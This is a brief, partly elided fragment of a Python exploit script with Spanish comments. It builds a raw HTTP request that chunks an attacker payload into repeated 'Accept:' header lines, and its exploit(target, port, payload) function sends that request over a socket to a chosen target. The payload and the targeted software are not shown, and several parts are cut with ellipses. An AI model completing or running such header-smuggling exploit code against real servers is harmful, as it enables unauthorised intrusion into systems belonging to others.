...
'''
    header += "Accept:"
    raw_str = raw.decode('utf-8')  # Decodificar raw a string
    if len(raw_str) < 50:
        result = raw_str
    else:
        group = re.findall(r'.{50}', raw_str)
        result = "\r\nAccept:".join(group)
        if len(raw_str) % 50:
            result += "\r\nAccept:" + raw_str[len(raw_str) - len(raw_str) % 50:]
    header += result
    header += "\r\n\r\n"
    return header
...
def exploit(target, port, payload):
    ...
    sock.send(raw.encode('utf-8'))  # Codificar raw a bytes antes de enviarlo
